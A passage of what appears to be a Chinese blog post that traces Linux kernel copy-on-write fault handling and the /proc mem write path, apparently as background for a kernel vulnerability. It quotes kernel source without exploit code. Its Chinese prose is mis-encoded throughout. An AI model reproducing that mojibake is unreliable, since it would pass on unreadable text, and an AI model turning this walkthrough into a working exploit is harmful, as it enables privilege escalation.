class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_fault</span><span class="params">(struct mm_struct *mm, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pte_t</span> *page_table, <span class="keyword">pmd_t</span> *pmd,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">pte_t</span> orig_pte)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">pgoff_t</span> pgoff = (((address &amp; PAGE_MASK)</span><br><span class="line">- vma-&gt;vm_start) &gt;&gt; PAGE_SHIFT) + vma-&gt;vm_pgoff;</span><br><span class="line"></span><br><span class="line">pte_unmap(page_table);</span><br><span class="line"><span class="comment">/* The VMA was not fully populated on mmap() or missing VM_DONTEXPAND */</span></span><br><span class="line"><span class="keyword">if</span> (!vma-&gt;vm_ops-&gt;fault)</span><br><span class="line"><span class="keyword">return</span> VM_FAULT_SIGBUS;</span><br><span class="line"><span class="keyword">if</span> (!(flags &amp; FAULT_FLAG_WRITE))</span><br><span class="line"><span class="keyword">return</span> do_read_fault(mm, vma, address, pmd, pgoff, flags,</span><br><span class="line">orig_pte);</span><br><span class="line"><span class="keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_SHARED))</span><br><span class="line"><span class="keyword">return</span> do_cow_fault(mm, vma, address, pmd, pgoff, flags,</span><br><span class="line">orig_pte);</span><br><span class="line"><span class="keyword">return</span> do_shared_fault(mm, vma, address, pmd, pgoff, flags, orig_pte);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸»è¦å°±æ˜¯ä¸‹é¢åˆ¤æ–­ï¼Œå¦‚æœæ˜¯éå†™çš„æ“ä½œå¼•èµ·çš„å¼‚å¸¸åˆ™è¿›å…¥<code>do_read_fault</code>å‡½æ•°ï¼Œå¦‚æœæ˜¯éå…±äº«å†…å­˜å¼•èµ·çš„å¼‚å¸¸åˆ™è¿›å…¥<code>do_cow_fault</code>ï¼Œå¦‚æœæ˜¯å› ä¸ºå…±äº«å†…å­˜å¼•èµ·çš„å¼‚å¸¸åˆ™è¿›å…¥<code>do_shared_fault</code>å‡½æ•°ä¸­å»ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_cow_fault</span><span class="params">(struct mm_struct *mm, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pmd_t</span> *pmd,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">pgoff_t</span> pgoff, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">pte_t</span> orig_pte)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">fault_page</span>, *<span class="title">new_page</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mem_cgroup</span> *<span class="title">memcg</span>;</span></span><br><span class="line"><span class="keyword">spinlock_t</span> *ptl;</span><br><span class="line"><span class="keyword">pte_t</span> *pte;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(anon_vma_prepare(vma)))</span><br><span class="line"><span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line"></span><br><span class="line">new_page = alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, address);</span><br><span class="line"><span class="keyword">if</span> (!new_page)</span><br><span class="line"><span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mem_cgroup_try_charge(new_page, mm, GFP_KERNEL, &amp;memcg)) &#123;</span><br><span class="line">page_cache_release(new_page);</span><br><span class="line"><span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ret = __do_fault(vma, address, pgoff, flags, new_page, &amp;fault_page);</span><br><span class="line"><span class="keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))</span><br><span class="line"><span class="keyword">goto</span> uncharge_out;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fault_page)</span><br><span class="line">copy_user_highpage(new_page, fault_page, address, vma);</span><br><span class="line">__SetPageUptodate(new_page);</span><br><span class="line"></span><br><span class="line">pte = pte_offset_map_lock(mm, pmd, address, &amp;ptl);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!pte_same(*pte, orig_pte))) &#123;</span><br><span class="line">pte_unmap_unlock(pte, ptl);</span><br><span class="line"><span class="keyword">if</span> (fault_page) &#123;</span><br><span class="line">unlock_page(fault_page);</span><br><span class="line">page_cache_release(fault_page);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The fault handler has no page to lock, so it holds</span></span><br><span class="line"><span class="comment"> * i_mmap_lock for read to protect against truncate.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">i_mmap_unlock_read(vma-&gt;vm_file-&gt;f_mapping);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">goto</span> uncharge_out;</span><br><span class="line">&#125;</span><br><span class="line">do_set_pte(vma, address, new_page, pte, <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">mem_cgroup_commit_charge(new_page, memcg, <span class="literal">false</span>);</span><br><span class="line">lru_cache_add_active_or_unevictable(new_page, vma);</span><br><span class="line">pte_unmap_unlock(pte, ptl);</span><br><span class="line"><span class="keyword">if</span> (fault_page) &#123;</span><br><span class="line">unlock_page(fault_page);</span><br><span class="line">page_cache_release(fault_page);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The fault handler has no page to lock, so it holds</span></span><br><span class="line"><span class="comment"> * i_mmap_lock for read to protect against truncate.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">i_mmap_unlock_read(vma-&gt;vm_file-&gt;f_mapping);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">uncharge_out:</span><br><span class="line">mem_cgroup_cancel_charge(new_page, memcg);</span><br><span class="line">page_cache_release(new_page);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ ¹æ®åå­—å¯ä»¥çœ‹å‡ºæ¥è¿™ä¸ªå‡½æ•°æ˜¯æˆ‘ä»¬æ¯”è¾ƒå…³æ³¨çš„å‡½æ•°ï¼Œ<code>new_page = alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, address);</code>é¦–å…ˆåˆ™å°±æ˜¯åˆ›å»ºä¸€ä¸ªç‰©ç†é¡µã€‚<code>ret = __do_fault(vma, address, pgoff, flags, new_page, &amp;fault_page);</code>è¿™é‡Œè¯»å–æ–‡ä»¶çš„å†…å®¹åˆ°<code>fault_page</code>ä¸­å»ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fault_page)</span><br><span class="line">  copy_user_highpage(new_page, fault_page, address, vma);</span><br></pre></td></tr></table></figure><p>éšååœ¨è¿™é‡Œå°†<code>fault_page</code>ä¸­çš„å†…å®¹æ‹·è´åˆ°<code>new_page</code>ä¸­å»ã€‚</p><p><code>if (unlikely(!pte_same(*pte, orig_pte))) </code>è¿™é‡ŒéªŒè¯pteå’Œ<code>orig_ptr</code>æ˜¯å¦ä¸€è‡´ï¼Œå¦‚æœä¸ä¸€è‡´åˆ™è¡¨ç¤ºpteä¸­é€”è¢«ä¿®æ”¹è¿‡é‚£ä¹ˆç›´æ¥é‡Šæ”¾ä¸¤ä¸ªå†…å­˜é¡µä¹‹åé€€å‡ºã€‚</p><p><code>do_set_pte(vma, address, new_page, pte, true, true);</code>åœ¨è¿™é‡Œè®¾ç½®pteä¸­çš„æ ‡å¿—ä½å¹¶ä¸”æ ‡ä¸Š<code>dirty</code>æ ‡å¿—ä½ï¼Œä¸è¿‡å› ä¸ºä¼šæ£€æµ‹æ–‡ä»¶æ˜¯å¦ä¸ºå¯å†™å¦‚æœä¸æ˜¯åˆ™ä¸ä¼šæ ‡è®°ä¸Š<code>write</code>ï¼Œæœ€åé‡Šæ”¾<code>fault_page</code>ç»“æŸå‡½æ•°ã€‚</p><p>åœ¨è¿›è¡Œå®Œç¬¬ä¸€æ­¥ä¹‹åå¦‚æœé¡µé¢ä¸å¯å†™çš„è¯å°±ä¼šè¿›å…¥åˆ°ç¬¬äºŒæ­¥ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_wp_page</span><span class="params">(struct mm_struct *mm, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pte_t</span> *page_table, <span class="keyword">pmd_t</span> *pmd,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">spinlock_t</span> *ptl, <span class="keyword">pte_t</span> orig_pte)</span></span></span><br><span class="line"><span class="function">__<span class="title">releases</span><span class="params">(ptl)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">old_page</span>;</span></span><br><span class="line"></span><br><span class="line">old_page = vm_normal_page(vma, address, orig_pte);</span><br><span class="line"><span class="keyword">if</span> (!old_page) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * VM_MIXEDMAP !pfn_valid() case, or VM_SOFTDIRTY clear on a</span></span><br><span class="line"><span class="comment"> * VM_PFNMAP VMA.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * We should not cow pages in a shared writeable mapping.</span></span><br><span class="line"><span class="comment"> * Just mark the pages writable and/or call ops-&gt;pfn_mkwrite.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> ((vma-&gt;vm_flags &amp; (VM_WRITE|VM_SHARED)) ==</span><br><span class="line">     (VM_WRITE|VM_SHARED))</span><br><span class="line"><span class="keyword">return</span> wp_pfn_shared(mm, vma, address, page_table, ptl,</span><br><span class="line">     orig_pte, pmd);</span><br><span class="line"></span><br><span class="line">pte_unmap_unlock(page_table, ptl);</span><br><span class="line"><span class="keyword">return</span> wp_page_copy(mm, vma, address, page_table, pmd,</span><br><span class="line">    orig_pte, old_page);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Take out anonymous pages first, anonymous shared vmas are</span></span><br><span class="line"><span class="comment"> * not dirty accountable.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (PageAnon(old_page) &amp;&amp; !PageKsm(old_page)) &#123;</span><br><span class="line"><span class="keyword">if</span> (!trylock_page(old_page)) &#123;</span><br><span class="line">page_cache_get(old_page);</span><br><span class="line">pte_unmap_unlock(page_table, ptl);</span><br><span class="line">lock_page(old_page);</span><br><span class="line">page_table = pte_offset_map_lock(mm, pmd, address,</span><br><span class="line"> &amp;ptl);</span><br><span class="line"><span class="keyword">if</span> (!pte_same(*page_table, orig_pte)) &#123;</span><br><span class="line">unlock_page(old_page);</span><br><span class="line">pte_unmap_unlock(page_table, ptl);</span><br><span class="line">page_cache_release(old_page);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">page_cache_release(old_page);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (reuse_swap_page(old_page)) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The page is all ours.  Move it to our anon_vma so</span></span><br><span class="line"><span class="comment"> * the rmap code will not search our parent or siblings.</span></span><br><span class="line"><span class="comment"> * Protected against the rmap code by the page lock.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">page_move_anon_rmap(old_page, vma, address);</span><br><span class="line">unlock_page(old_page);</span><br><span class="line"><span class="keyword">return</span> wp_page_reuse(mm, vma, address, page_table, ptl,</span><br><span class="line">     orig_pte, old_page, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">unlock_page(old_page);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (unlikely((vma-&gt;vm_flags &amp; (VM_WRITE|VM_SHARED)) ==</span><br><span class="line">(VM_WRITE|VM_SHARED))) &#123;</span><br><span class="line"><span class="keyword">return</span> wp_page_shared(mm, vma, address, page_table, pmd,</span><br><span class="line">      ptl, orig_pte, old_page);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Ok, we need to copy. Oh, well..</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">page_cache_get(old_page);</span><br><span class="line"></span><br><span class="line">pte_unmap_unlock(page_table, ptl);</span><br><span class="line"><span class="keyword">return</span> wp_page_copy(mm, vma, address, page_table, pmd,</span><br><span class="line">    orig_pte, old_page);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆé€šè¿‡<code>old_page = vm_normal_page(vma, address, orig_pte);</code>è·å–ç¼ºé¡µçš„çº¿æ€§åœ°å€å¯¹åº”çš„<code>struct page</code>ç»“æ„ï¼Œå¯¹äºä¸€äº›ç‰¹æ®Šæ˜ å°„çš„é¡µé¢ï¼ˆå¦‚é¡µé¢å›æ”¶ã€é¡µè¿ç§»å’ŒKSMç­‰ï¼‰ï¼Œå†…æ ¸å¹¶ä¸å¸Œæœ›è¿™äº›é¡µå‚ä¸åˆ°å†…å­˜ç®¡ç†çš„ä¸€äº›æµç¨‹å½“ä¸­ï¼Œç§°ä¹‹ä¸º<code>special mapping</code>ï¼Œå¹¶æ— å¯¹åº”çš„<code>struct page</code>ç»“æ„ä½“ã€‚</p><p>ç´§æ¥ç€åˆ¤æ–­æ˜¯å¦ä¸º<code>special mapping</code>ï¼Œå¦‚æœæ˜¯åˆ™ä¼šè¿›å…¥ifåˆ†æ”¯ï¼Œå½“ç„¶æˆ‘ä»¬è¿™é‡Œä¸æ˜¯ã€‚</p><p>éšååˆ¤æ–­é¡µé¢æ˜¯å¦ä¸ºåŒ¿åé¡µå¹¶ä¸”ä¸ä¸ºKSMï¼Œå¦‚æœæˆç«‹å¹¶ä¸”å¯ä»¥æˆåŠŸä¸Šé”åˆ™è¿›å…¥ä»¥ä¸‹è¯­å¥ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (reuse_swap_page(old_page)) &#123;</span><br><span class="line">  page_move_anon_rmap(old_page, vma, address);</span><br><span class="line">  unlock_page(old_page);</span><br><span class="line">  <span class="keyword">return</span> wp_page_reuse(mm, vma, address, page_table, ptl,</span><br><span class="line">                       orig_pte, old_page, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­é¦–å…ˆé€šè¿‡<code>reuse_swap_page</code>åˆ¤æ–­æ˜¯å¦åªæœ‰ä¸€ä¸ªè¿›ç¨‹åœ¨ä½¿ç”¨è¯¥é¡µï¼Œå¦‚æœæ˜¯åˆ™ç›´æ¥è°ƒç”¨<code>wp_page_reuse</code>å‡½æ•°é‡ç”¨è¯¥é¡µã€‚å¦‚æœä»¥ä¸Šçš„æ‰€æœ‰éƒ½æ²¡æ»¡è¶³åˆ™è¿›å…¥æœ€åçš„æ— æ³•é‡ç”¨è¿›è¡Œå†™æ—¶å¤åˆ¶ã€‚</p><p>é‚£ä¹ˆä»¥ä¸Šå°±æ˜¯COWçš„å…¨éƒ¨æµç¨‹äº†ï¼Œæ¥ä¸‹æ¥åˆ†æä¸€ä¸‹<code>write</code>å‡½æ•°ã€‚</p><h3 id="writeå‡½æ•°åˆ†æ"><a href="#writeå‡½æ•°åˆ†æ" class="headerlink" title="writeå‡½æ•°åˆ†æ"></a>writeå‡½æ•°åˆ†æ</h3><p>å…·ä½“æµç¨‹å…¶å®å°±æ˜¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys_write() =&gt; vfs_write() =&gt; __vfs_write() =&gt; file-&gt;f_op-&gt;write() =&gt; mem_write() =&gt; mem_rw()</span><br></pre></td></tr></table></figure><h4 id="mem-rw"><a href="#mem-rw" class="headerlink" title="mem_rw"></a><strong>mem_rw</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">mem_rw</span><span class="params">(struct file *file, <span class="keyword">char</span> __user *buf,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">size_t</span> count, <span class="keyword">loff_t</span> *ppos, <span class="keyword">int</span> write)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> file-&gt;private_data;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> addr = *ppos;</span><br><span class="line"><span class="keyword">ssize_t</span> copied;</span><br><span class="line"><span class="keyword">char</span> *page;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!mm)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">page = (<span class="keyword">char</span> *)__get_free_page(GFP_TEMPORARY);</span><br><span class="line"><span class="keyword">if</span> (!page)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">copied = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (!atomic_inc_not_zero(&amp;mm-&gt;mm_users))</span><br><span class="line"><span class="keyword">goto</span> <span class="built_in">free</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">int</span> this_len = <span class="keyword">min_t</span>(<span class="keyword">int</span>, count, PAGE_SIZE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (write &amp;&amp; copy_from_user(page, buf, this_len)) &#123;</span><br><span class="line">copied = -EFAULT;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">this_len = access_remote_vm(mm, addr, page, this_len, write);</span><br><span class="line"><span class="keyword">if</span> (!this_len) &#123;</span><br><span class="line"><span class="keyword">if</span> (!copied)</span><br><span class="line">copied = -EIO;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!write &amp;&amp; copy_to_user(buf, page, this_len)) &#123;</span><br><span class="line">copied = -EFAULT;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">buf += this_len;</span><br><span class="line">addr += this_len;</span><br><span class="line">copied += this_len;</span><br><span class="line">count -= this_len;</span><br><span class="line">&#125;</span><br><span class="line">*ppos = addr;</span><br><span class="line"></span><br><span class="line">mmput(mm);</span><br><span class="line"><span class="built_in">free</span>:</span><br><span class="line">free_page((<span class="keyword">unsigned</span> <span class="keyword">long</span>) page);</span><br><span class="line"><span class="keyword">return</span> copied;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„æµç¨‹è¿˜æ˜¯å¬æ¸…æ™°çš„ï¼Œé¦–å…ˆå°±æ˜¯è·å–ä¸€ä¸ªä¸´æ—¶çš„å†…å­˜é¡µï¼Œç´§æ¥ç€å°†ç”¨æˆ·ç©ºé—´çš„å†…å®¹æ”¾åˆ°ä¸´æ—¶çš„å†…å­˜é¡µä¸­å³å¯ï¼Œæ¥ç€åˆ©ç”¨<code>access_remote_vm</code>å‡½æ•°è®¿é—®å†…å­˜ï¼Œç„¶ååé¢æ˜¯å¦‚æœä¸æ˜¯å†™çš„è¯å°±è¿”å›å†…å®¹åˆ°ç”¨æˆ·ç©ºé—´ï¼Œæœ€åé‡Šæ”¾ä¸´æ—¶å†…å­˜é¡µã€‚</p><h4 id="access-remote-vm"><a href="#access-remote-vm" class="headerlink" title="access_remote_vm"></a><strong>access_remote_vm</strong></h4><p><code>access_remote_vm</code>å‡½æ•°å…¶å®å°±æ˜¯<code>__access_remote_vm</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __access_remote_vm(struct task_struct *tsk, struct mm_struct *mm,</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">void</span> *buf, <span class="keyword">int</span> len, <span class="keyword">int</span> write)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>;</span></span><br><span class="line"><span class="keyword">void</span> *old_buf = buf;</span><br><span class="line"></span><br><span class="line">down_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line"><span class="comment">/* ignore errors, just check how much was successfully transferred */</span></span><br><span class="line"><span class="keyword">while</span> (len) &#123;</span><br><span class="line"><span class="keyword">int</span> bytes, ret, offset;</span><br><span class="line"><span class="keyword">void</span> *maddr;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">ret = get_user_pages(tsk, mm, addr, <span class="number">1</span>,</span><br><span class="line">write, <span class="number">1</span>, &amp;page, &amp;vma);</span><br><span class="line"><span class="keyword">if</span> (ret &lt;= <span class="number">0</span>) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_HAVE_IOREMAP_PROT</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Check if this is a VM_IO | VM_PFNMAP VMA, which</span></span><br><span class="line"><span class="comment"> * we can access using slightly different code.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">vma = find_vma(mm, addr);</span><br><span class="line"><span class="keyword">if</span> (!vma || vma-&gt;vm_start &gt; addr)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (vma-&gt;vm_ops &amp;&amp; vma-&gt;vm_ops-&gt;access)</span><br><span class="line">ret = vma-&gt;vm_ops-&gt;access(vma, addr, buf,</span><br><span class="line">  len, write);</span><br><span class="line"><span class="keyword">if</span> (ret &lt;= <span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">bytes = ret;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">bytes = len;</span><br><span class="line">offset = addr &amp; (PAGE_SIZE<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">if</span> (bytes &gt; PAGE_SIZE-offset)</span><br><span class="line">bytes = PAGE_SIZE-offset;</span><br><span class="line"></span><br><span class="line">maddr = kmap(page);</span><br><span class="line"><span class="keyword">if</span> (write) &#123;</span><br><span class="line">copy_to_user_page(vma, page, addr,</span><br><span class="line">  maddr + offset, buf, bytes);</span><br><span class="line">set_page_dirty_lock(page);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">copy_from_user_page(vma, page, addr,</span><br><span class="line">    buf, maddr + offset, bytes);</span><br><span class="line">&#125;</span><br><span 